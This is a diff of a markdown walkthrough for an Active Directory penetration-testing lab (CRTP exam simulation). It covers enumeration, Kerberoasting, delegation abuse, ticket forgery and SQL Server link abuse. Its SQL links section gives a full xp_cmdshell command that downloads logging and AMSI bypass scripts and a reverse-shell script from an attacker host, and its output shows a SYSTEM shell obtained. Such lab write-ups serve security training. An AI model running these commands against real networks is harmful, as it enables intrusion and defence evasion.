@@ -3,33 +3,35 @@
 ## Tasks
 
 - [x] Domain Enumeration
-	- [x] Domain Enumeration | Forests, Domains, Trusts (with PowerView)
-	- [ ] Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)
-	- [ ] Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)
-	- [ ] Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter)
+	- [x] Domain Enumeration | Domains, Forests, Trusts (with PowerView)
+	- [x] Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)
+	- [x] Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)
+	- [x] Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter, PowerView)
 - [x] Local Privilege Escalation
 	- [x] Local Privilege Escalation | Feature Abuse (with PowerUp, winPEAS, PrivEscCheck)
 	- [x] Local Privilege Escalation | GPO Abuse (with Impacket's ntlmrelayx, GPOddity)
+- [ ] Domain Lateral Movement
+	- [ ] Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
 - [ ] Domain Privilege Escalation
-	- [ ] Domain Privilege Escalation, Lateral Movement (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
 	- [x] Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)
-	- [x] Domain Privilege Escalation | Unconstrained Delegation + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)
-	- [x] Domain Privilege Escalation | Constrained Delegation + DCSync (with PowerView, Rubeus, SafetyKatz)
-	- [x] Domain Privilege Escalation | Resource-based Constrained Delegation (with PowerView, Rubeus, SafetyKatz)
+	- [x] Domain Privilege Escalation | Unconstrained Delegation Abuse + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)
+	- [x] Domain Privilege Escalation | Constrained Delegation Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
+	- [x] Domain Privilege Escalation | Resource-based Constrained Delegation Abuse (with PowerView, Rubeus, SafetyKatz)
 - [x] Domain Persistence
 	- [x] Domain Persistence | Golden Ticket + DCSync (with Rubeus, SafetyKatz)
 	- [x] Domain Persistence | Silver Ticket (with Rubeus, SafetyKatz)
 	- [x] Domain Persistence | Diamond Ticket (with Rubeus)
 	- [x] Domain Persistence | DSRM (with PowerView, Rubeus, SafetyKatz)
-	- [x] Domain Persistence using ACLs | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
-	- [x] Domain Persistence using ACLs | Security Descriptors (with Rubeus, RACE)
+	- [x] Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
+	- [x] Domain Persistence | Security Descriptors Abuse (with Rubeus, RACE)
 - [ ] Cross Trust Attacks
 	- [x] Cross Trust Attacks | Domains Trust Key Abuse (with Rubeus, SafetyKatz)
 	- [x] Cross Trust Attacks | Child `krbtgt` Key Hash Abuse (with Rubeus)
 	- [x] Cross Trust Attacks | Forests Trust Key Abuse (with Rubeus, SafetyKatz)
-	- [x] Cross Trust Attacks | AD CS Abuse - ESC1 + ESC3 (with Certify, Rubeus)
-	- [x] Cross Trust Attacks | MSSQL Database Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
-	- [ ] Cross Trust Attacks | MSSQL Database Links Abuse + OPSEC (with ...)
+	- [x] Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
+	- [ ] Cross Trust Attacks | SQL Server Links Abuse + OPSEC (with ...)
+- [x] AD Certificate Services Abuse
+	- [x] AD Certificate Services Abuse | ESC1 + ESC3 (with Certify, Rubeus)
 
 ---
 
@@ -46,7 +48,7 @@
 
 `Import-Module C:\AD\Tools\PowerView.ps1`
 
-#### Domain Enumeration | Forests, Domains, Trusts (with PowerView)
+#### Domain Enumeration | Domains, Forests, Trusts (with PowerView)
 
 **Domain Enumeration | Forests**
 
@@ -188,9 +190,15 @@ Name                    : eu.eurocorp.local🏛️
 | ------------------ | --------------------------------- | ------------------------------ | --------------------------------------- | ------------------------------------------------------------------ |
 | moneycorp.local 🏰 | moneycorp.local 🏛️               | -                              | mcorp-dc.moneycorp.local 🖥️             | -                                                                  |
 | moneycorp.local 🏰 | dollarcorp.moneycorp.local 🏛️    | moneycorp.local 🏰             | dcorp-dc.dollarcorp.moneycorp.local 🖥️  | Bidirectional 🔗 with moneycorp.local 🏰                          |
-| moneycorp.local 🏰 | us.dollarcorp.moneycorp.local 🏛️ | dollarcorp.moneycorp.local 🏛️ | us-dc.us.dollarcorp.moneycorp.local 🖥️   | Bidirectional 🔗 with dollarcorp.moneycorp.local 🏛️               |
+| moneycorp.local 🏰 | us.dollarcorp.moneycorp.local 🏛️ | dollarcorp.moneycorp.local 🏛️  | us-dc.us.dollarcorp.moneycorp.local 🖥️  | Bidirectional 🔗 with dollarcorp.moneycorp.local 🏛️               |
 | eurocorp.local 🏰  | eurocorp.local 🏛️                | -                              | eurocorp-dc.eurocorp.local 🖥️           | Bidirectional 🔗 with dollarcorp.moneycorp.local 🏛️ (FILTER_SIDS)  |
-| eurocorp.local 🏰  | eu.eurocorp.local 🏛️             | eurocorp.local 🏛️             | -                                        | -                                                                  |
+| eurocorp.local 🏰  | eu.eurocorp.local 🏛️             | eurocorp.local 🏛️              | -                                       | -                                                                  |
+
+![BloodHound Legacy | Analysis - Find all Domain Admins](./assets/screenshots/crtp_exam_simulation_bloodhound_find_all_domain_admins.png)
+
+![BloodHound Legacy | Analysis - Find Shortest Paths to Domain Admins](./assets/screenshots/crtp_exam_simulation_bloodhound_find_shortest_paths_domain_admins.png)
+
+![BloodHound Legacy | Analysis - Find Principals with DCSync Rights](./assets/screenshots/crtp_exam_simulation_bloodhound_find_principals_with_dcsync_rights.png)
 
 #### Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)
 
@@ -551,13 +559,6 @@ objectclass              : {top, container, groupPolicyContainer}
 objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
 ```
 
-BloodHound...
-
-``:
-```
-
-```
-
 **Domain Enumeration | OUs**
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
@@ -909,7 +910,15 @@ Local System            CreateChild, DeleteChild, Self, WriteProperty, DeleteTre
 Creator Owner           CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
 ```
 
-#### Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter)
+![BloodHound Legacy | Node Info: Applocker - Explicit Object Controllers](./assets/screenshots/crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_01.png)
+
+![BloodHound Legacy | Node Info: Applocker - Affected OUs](./assets/screenshots/crtp_exam_simulation_bloodhound_node_info_affected_ous_01.png)
+
+![BloodHound Legacy | Node Info: DevOps Policy - Explicit Object Controllers](./assets/screenshots/crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_02.png)
+
+![BloodHound Legacy | Node Info: DevOps Policy - Affected OUs](./assets/screenshots/crtp_exam_simulation_bloodhound_node_info_affected_ous_02.png)
+
+#### Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter, PowerView)
 
 **Domain Enumeration | Shares**
 
@@ -1130,10 +1139,18 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) (
 
 `Import-Module C:\AD\Tools\PowerView.ps1`
 
-`Find-DomainUserLocation -ComputerName (type C:\AD\Tools\servers.txt)`:
+`Find-DomainUserLocation`:
+```
+UserDomain      : DCORP-STD422🖥️
+UserName        : Administrator👤
+ComputerName    : dcorp-std422.dollarcorp.moneycorp.local
+IPAddress       : 172.16.100.22
+SessionFrom     :
+SessionFromName :
+LocalAdmin      :
 ```
 
-```
+---
 
 ### Local Privilege Escalation
 
@@ -1639,9 +1656,16 @@ USERNAME=student422👤
 ```
 🚩
 
-### Domain Privilege Escalation
+---
 
-#### Domain Privilege Escalation, Lateral Movement (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
+### Domain Lateral Movement
+
+#### Domain Lateral Movement | PowerShell Remoting + Credential Extraction + OverPass-The-Hash (with Invoke-SessionHunter, SafetyKatz, Rubeus, Invoke-Mimi, Runas, Find-PSRemotingLocalAdminAccess)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
 
 `Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`
 
@@ -1694,6 +1718,10 @@ dcorp-adminsrv dcorp\websvc                 True
 ```
 
 ```
+
+---
+
+### Domain Privilege Escalation
 
 #### Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)
 
@@ -1748,6 +1776,8 @@ name                  : svc admin
 
 [SNIP]
 ```
+
+![BloodHound Legacy | Analysis - List all Kerberoastable Accounts](./assets/screenshots/crtp_exam_simulation_bloodhound_list_all_kerberoastable_accounts.png)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt`:
 ```
@@ -1837,7 +1867,7 @@ Session completed
 
 ```
 
-#### Domain Privilege Escalation | Unconstrained Delegation + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)
+#### Domain Privilege Escalation | Unconstrained Delegation Abuse + Coercion + DCSync (with PowerView, Rubeus, Find-PSRemotingLocalAdminAccess, MS-RPRN, SafetyKatz)
 
 - **Find a Target Server where Unconstrained Delegation is Enabled**
 
@@ -3583,7 +3613,7 @@ dcorp-dc🖥️
 ```
 🚩
 
-#### Domain Persistence using ACLs | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
+#### Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
@@ -3891,7 +3921,7 @@ Supplemental Credentials:
 ```
 🚩
 
-#### Domain Persistence using ACLs | Security Descriptors (with Rubeus, RACE)
+#### Domain Persistence | Security Descriptors Abuse (with Rubeus, RACE)
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -4625,7 +4655,7 @@ COMPUTERNAME=MCORP-DC🖥️
 ```
 🚩
 
-#### Cross Trust Attacks - Child `krbtgt` Key Hash Abuse
+#### Cross Trust Attacks - Child Domain `krbtgt` Key Hash Abuse
 
 - **Forge a Golden Ticket (with EA SID History) using the `krbtgt` TGT Encryption Key Hash from the Child DC for Privilege Escalation**
 
@@ -4934,7 +4964,211 @@ Dollarcorp DAs can read this!📌
 ```
 🚩
 
-#### Cross Trust Attacks | AD CS Abuse - ESC1 + ESC3 (with Certify, Rubeus)
+#### Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
+
+- **Find a Target SQL Server where we have Connection Privileges**
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`
+
+`Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose`:
+```
+VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local,1433 : Connection Failed.
+VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local : Connection Failed.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.📌
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.📌
+VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local,1433 : Connection Failed.
+VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local : Connection Failed.
+
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL🖥️
+DomainName             : dcorp🏛️
+ServiceProcessID       : 1892
+ServiceName            : MSSQLSERVER🗄️
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 15.0.2000.5
+SQLServerMajorVersion  : 2019
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student422👤
+IsSysadmin             : No
+ActiveSessions         : 1
+```
+
+- **Find the existing Database Links from the Target SQL Server**
+
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose`:
+```
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: DCORP-MSSQL🖥️
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DCORP-MSSQL
+VERBOSE:  - Link Login: dcorp\student422
+VERBOSE:  - Link IsSysAdmin: 0
+VERBOSE:  - Link Count: 1
+VERBOSE:  - Links on this server: DCORP-SQL1
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: DCORP-SQL1🖥️
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
+VERBOSE:  - Link Login: dblinkuser
+VERBOSE:  - Link IsSysAdmin: 0
+VERBOSE:  - Link Count: 1
+VERBOSE:  - Links on this server: DCORP-MGMT
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: DCORP-MGMT🖥️
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
+VERBOSE:  - Link Login: sqluser
+VERBOSE:  - Link IsSysAdmin: 0
+VERBOSE:  - Link Count: 1
+VERBOSE:  - Links on this server: EU-SQL26.EU.EUROCORP.LOCAL
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: --------------------------------
+VERBOSE:  Server: EU-SQL26🖥️
+VERBOSE: --------------------------------
+VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> EU-SQL26.EU.EUROCORP.LOCAL🔗
+VERBOSE:  - Link Login: sa
+VERBOSE:  - Link IsSysAdmin: 1
+VERBOSE:  - Link Count: 0
+VERBOSE:  - Links on this server:
+
+
+Version     : SQL Server 2019
+Instance    : DCORP-MSSQL🖥️
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student422👤
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2019
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2019
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL26.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2019
+Instance    : EU-SQL26🖥️
+CustomQuery :
+Sysadmin    : 1📌
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL26.EU.EUROCORP.LOCAL}
+User        : sa👤
+Links       :
+```
+
+- **Check if we can Execute Commands on a Linked Database**
+
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"`:
+```
+Version     : SQL Server 2019
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student422
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2019
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2019
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL26.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2019
+Instance    : EU-SQL26🗄️
+CustomQuery : {USERNAME=SYSTEM, }📌
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL26.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+
+- **Obtain a Reverse Shell executing a PowerShell Script on the Target Linked Database**
+  
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`:
+```
+listening on [any] 443 ...
+
+[...]
+```
+
+![Invoke-PowerShellTcpEx.ps1](./assets/screenshots/learning_objective_22_invokepowershelltcpex.png)
+
+![HFS - Scripts](./assets/screenshots/learning_objective_22_hfs_scripts.png)
+
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.22/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.22/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.22/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql26`
+
+```
+[...]
+
+172.16.15.17: inverse host lookup failed: h_errno 11004: NO_DATA
+connect to [172.16.100.22] from (UNKNOWN) [172.16.15.17] 61960: NO_DATA
+Windows PowerShell running as user SYSTEM on EU-SQL26
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>
+```
+🚀
+
+![eu-sql26 | system](https://custom-icon-badges.demolab.com/badge/eu--sql26-system-64b5f6?logo=windows11&logoColor=white)
+
+`$env:username`:
+```
+SYSTEM👤
+```
+
+`$env:computername`:
+```
+EU-SQL26🖥️
+```
+🚩
+
+---
+
+### AD Certificate Services Abuse
+
+#### AD Certificate Services Abuse | ESC1 + ESC3 (with Certify, Rubeus)
 
 - **Find ESC1 Vulnerable Certificate Templates**
 
@@ -5663,206 +5897,6 @@ Cached Tickets: (1)
 `winrs -r:mcorp-dc cmd /c set username`:
 ```
 USERNAME=Administrator👑
-```
-🚩
-
-#### Cross Trust Attacks | MSSQL Database Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
-
-- **Find a Target SQL Server where we have Connection Privileges**
-
-![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
-
-`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`
-
-`Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose`:
-```
-VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local,1433 : Connection Failed.
-VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local : Connection Failed.
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.📌
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.📌
-VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local,1433 : Connection Failed.
-VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local : Connection Failed.
-
-ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
-Instance               : DCORP-MSSQL🖥️
-DomainName             : dcorp🏛️
-ServiceProcessID       : 1892
-ServiceName            : MSSQLSERVER🗄️
-ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
-AuthenticationMode     : Windows and SQL Server Authentication
-ForcedEncryption       : 0
-Clustered              : No
-SQLServerVersionNumber : 15.0.2000.5
-SQLServerMajorVersion  : 2019
-SQLServerEdition       : Developer Edition (64-bit)
-SQLServerServicePack   : RTM
-OSArchitecture         : X64
-OsVersionNumber        : SQL
-Currentlogin           : dcorp\student422👤
-IsSysadmin             : No
-ActiveSessions         : 1
-```
-
-- **Find the existing Database Links from the Target SQL Server**
-
-`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose`:
-```
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
-VERBOSE: --------------------------------
-VERBOSE:  Server: DCORP-MSSQL🖥️
-VERBOSE: --------------------------------
-VERBOSE:  - Link Path to server: DCORP-MSSQL
-VERBOSE:  - Link Login: dcorp\student422
-VERBOSE:  - Link IsSysAdmin: 0
-VERBOSE:  - Link Count: 1
-VERBOSE:  - Links on this server: DCORP-SQL1
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
-VERBOSE: --------------------------------
-VERBOSE:  Server: DCORP-SQL1🖥️
-VERBOSE: --------------------------------
-VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
-VERBOSE:  - Link Login: dblinkuser
-VERBOSE:  - Link IsSysAdmin: 0
-VERBOSE:  - Link Count: 1
-VERBOSE:  - Links on this server: DCORP-MGMT
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
-VERBOSE: --------------------------------
-VERBOSE:  Server: DCORP-MGMT🖥️
-VERBOSE: --------------------------------
-VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
-VERBOSE:  - Link Login: sqluser
-VERBOSE:  - Link IsSysAdmin: 0
-VERBOSE:  - Link Count: 1
-VERBOSE:  - Links on this server: EU-SQL26.EU.EUROCORP.LOCAL
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
-VERBOSE: --------------------------------
-VERBOSE:  Server: EU-SQL26🖥️
-VERBOSE: --------------------------------
-VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> EU-SQL26.EU.EUROCORP.LOCAL🔗
-VERBOSE:  - Link Login: sa
-VERBOSE:  - Link IsSysAdmin: 1
-VERBOSE:  - Link Count: 0
-VERBOSE:  - Links on this server:
-
-
-Version     : SQL Server 2019
-Instance    : DCORP-MSSQL🖥️
-CustomQuery :
-Sysadmin    : 0
-Path        : {DCORP-MSSQL}
-User        : dcorp\student422👤
-Links       : {DCORP-SQL1}
-
-Version     : SQL Server 2019
-Instance    : DCORP-SQL1
-CustomQuery :
-Sysadmin    : 0
-Path        : {DCORP-MSSQL, DCORP-SQL1}
-User        : dblinkuser
-Links       : {DCORP-MGMT}
-
-Version     : SQL Server 2019
-Instance    : DCORP-MGMT
-CustomQuery :
-Sysadmin    : 0
-Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
-User        : sqluser
-Links       : {EU-SQL26.EU.EUROCORP.LOCAL}
-
-Version     : SQL Server 2019
-Instance    : EU-SQL26🖥️
-CustomQuery :
-Sysadmin    : 1📌
-Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL26.EU.EUROCORP.LOCAL}
-User        : sa👤
-Links       :
-```
-
-- **Check if we can Execute Commands on a Linked Database**
-
-`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"`:
-```
-Version     : SQL Server 2019
-Instance    : DCORP-MSSQL
-CustomQuery :
-Sysadmin    : 0
-Path        : {DCORP-MSSQL}
-User        : dcorp\student422
-Links       : {DCORP-SQL1}
-
-Version     : SQL Server 2019
-Instance    : DCORP-SQL1
-CustomQuery :
-Sysadmin    : 0
-Path        : {DCORP-MSSQL, DCORP-SQL1}
-User        : dblinkuser
-Links       : {DCORP-MGMT}
-
-Version     : SQL Server 2019
-Instance    : DCORP-MGMT
-CustomQuery :
-Sysadmin    : 0
-Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
-User        : sqluser
-Links       : {EU-SQL26.EU.EUROCORP.LOCAL}
-
-Version     : SQL Server 2019
-Instance    : EU-SQL26🗄️
-CustomQuery : {USERNAME=SYSTEM, }📌
-Sysadmin    : 1
-Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL26.EU.EUROCORP.LOCAL}
-User        : sa
-Links       :
-```
-
-- **Obtain a Reverse Shell executing a PowerShell Script on the Target Linked Database**
-  
-![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`:
-```
-listening on [any] 443 ...
-
-[...]
-```
-
-![Invoke-PowerShellTcpEx.ps1](./assets/screenshots/learning_objective_22_invokepowershelltcpex.png)
-
-![HFS - Scripts](./assets/screenshots/learning_objective_22_hfs_scripts.png)
-
-`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.22/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.22/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.22/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql26`
-
-```
-[...]
-
-172.16.15.17: inverse host lookup failed: h_errno 11004: NO_DATA
-connect to [172.16.100.22] from (UNKNOWN) [172.16.15.17] 61960: NO_DATA
-Windows PowerShell running as user SYSTEM on EU-SQL26
-Copyright (C) 2015 Microsoft Corporation. All rights reserved.
-
-PS C:\Windows\system32>
-```
-🚀
-
-![eu-sql26 | system](https://custom-icon-badges.demolab.com/badge/eu--sql26-system-64b5f6?logo=windows11&logoColor=white)
-
-`$env:username`:
-```
-SYSTEM👤
-```
-
-`$env:computername`:
-```
-EU-SQL26🖥️
 ```
 🚩
 
